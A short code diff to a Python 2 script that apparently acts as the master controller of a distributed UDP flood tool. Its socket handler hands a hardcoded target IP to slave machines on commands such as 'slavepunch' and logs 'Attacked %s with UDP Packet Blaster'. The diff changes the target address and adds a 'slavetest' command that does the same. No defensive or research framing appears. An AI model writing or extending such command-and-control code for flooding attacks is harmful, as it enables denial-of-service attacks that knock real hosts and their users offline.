@@ -8,12 +8,13 @@ import datetime
 
 master='master'
 ping='slaveping'
-punch="slavepunch"
+punch= "slavepunch"
+test = "slavetest"
 slaveping='udp'
 global ipAdd
 global numPing
 global ping_time
-ipAdd ='198.252.11.70'
+ipAdd ='192.168.4.161'
 numPing = 5
 ping_time = "2013-03-27-21-05-0"
 
@@ -47,6 +48,10 @@ def handler(clientsock,addr):
 			elif data == punch:
 				clientsock.send(ipAdd)
 				print >>sys.stderr, 'Attacked %s with UDP Packet Blaster' % ipAdd
+				break
+			elif data == test:
+				clientsock.send(ipAdd)
+				print >>sys.stderr, 'Attacked %s with Test' % ipAdd
 				break
 			elif data == slaveping:
 				clientsock.send(ipAdd)
